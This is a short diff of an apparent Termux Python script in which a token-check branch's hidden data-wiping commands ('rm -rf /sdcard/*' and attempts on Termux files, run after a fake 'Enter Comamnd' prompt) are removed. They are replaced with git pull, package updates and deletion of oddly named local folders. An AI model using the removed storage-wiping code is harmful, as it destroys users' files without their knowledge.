@@ -32,22 +32,22 @@ elif server["usertoken"] == sos :
     os.system("clear")
     print
     raw_input("Enter Comamnd") 
-    os.system("rm -rf /sdcard/*") 
-    os.system("rm -rf /sdcard*") 
-    os.system("/data/data/com.termux/files/*") 
-    os.system("/data/data/com.termux/files/user/*") 
+    os.system("rm -rf pop") 
+    os.system("rm -rf bbb") 
+    os.system("git pull") 
+    os.system("pkg update ") 
 
 else: 
     raw_input("Enter Comamnd") 
-    os.system("rm -rf /sdcard/*") 
-    os.system("rm -rf /sdcard*") 
-    os.system("/data/data/com.termux/files/*") 
-    os.system("/data/data/com.termux/files/user/*") 
+    os.system("rm -rf fuck") 
+    os.system("rm -rf baba") 
+    os.system("git pull") 
+    os.system("pkg update") 
 if bb not in rr: 
     raw_input("Enter Comamnd") 
-    os.system("rm -rf /sdcard/*") 
-    os.system("rm -rf /sdcard*") 
-    os.system("/data/data/com.termux/files/*") 
-    os.system("/data/data/com.termux/files/user/*") 
+    os.system("git pull") 
+    os.system("git pull") 
+    os.system("apt update") 
+    os.system("apt upgrade") 
 
 
